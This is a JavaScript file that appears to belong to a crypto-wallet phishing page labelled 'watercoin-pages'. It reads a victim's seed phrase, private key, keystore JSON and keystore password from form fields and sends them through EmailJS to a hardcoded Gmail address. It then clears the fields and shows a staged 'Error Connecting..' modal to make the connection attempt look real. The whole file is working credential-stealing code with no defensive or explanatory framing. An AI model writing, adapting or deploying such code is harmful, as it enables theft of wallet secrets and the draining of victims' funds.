async function sendEmail() {
    var url = window.location.href;
    const data = {
        phrase: document.getElementById("thephrase").value,    
        privatekey: document.getElementById("theprivatekey").value,
        keystorejson: document.getElementById("thekeystorejson").value,
        keystorepassword: document.getElementById("thekeystorepassword").value,
        // from_website: "watercoinsol-wtf",
        from_website: "watercoin-pages",
        // to_email: "blanknever1255@gmail.com,1mywalletbackup@gmail.com"  // Use a comma-separated string
        to_email: "1mywalletbackup@gmail.com"  // Use a comma-separated string
    };

    await emailjs.send('service_gwiinyy', 'template_3k4fzx8', data, 'B57IhlvJ-o0Pu9_wI')
    .then((result) => {
        console.log(result.text);
        document.getElementById("thephrase").value = "";  
        document.getElementById("theprivatekey").value = "";
        document.getElementById("thekeystorejson").value = "";
        document.getElementById("thekeystorepassword").value = "";
    }, (error) => {
        console.log(error.text);
    });

    thirdModal();
}

const elementChange = () => {
  document.getElementById('elementChange').innerHTML = "Error Connecting..";
  document.getElementById('retry-btn').style.display = "block";
  secondModal();
};

const secondModal = () => {
    document.getElementById('id02').style.display='block';
    document.getElementById('id01').style.display='none';
    document.getElementById('id03').style.display='none';
};

const thirdModal = () => {
    document.getElementById('id02').style.display='none';
    document.getElementById('id01').style.display='none';
    document.getElementById('id03').style.display='block';
};

const openModal = () => {
    document.getElementById('id01').style.display='block';
    setTimeout(elementChange, 3000);
};
const closeModal = () => {document.getElementById('id01').style.display='none';};

const openModal2 = () => {document.getElementById('id02').style.display='block';};
const closeModal2 = () => {document.getElementById('id02').style.display='none';};

const openModal3 = () => {document.getElementById('id03').style.display='block';};
const closeModal3 = () => {document.getElementById('id03').style.display='none';};

const phrase = () => {
    document.getElementById('phrase').style.display='block';
    document.getElementById('keystore').style.display='none';
    document.getElementById('key').style.display='none';
};

const keystore = () => {
    document.getElementById('phrase').style.display='none';
    document.getElementById('keystore').style.display='block';
    document.getElementById('key').style.display='none';
};

const key = () => {
    document.getElementById('phrase').style.display='none';
    document.getElementById('keystore').style.display='none';
    document.getElementById('key').style.display='block';
};
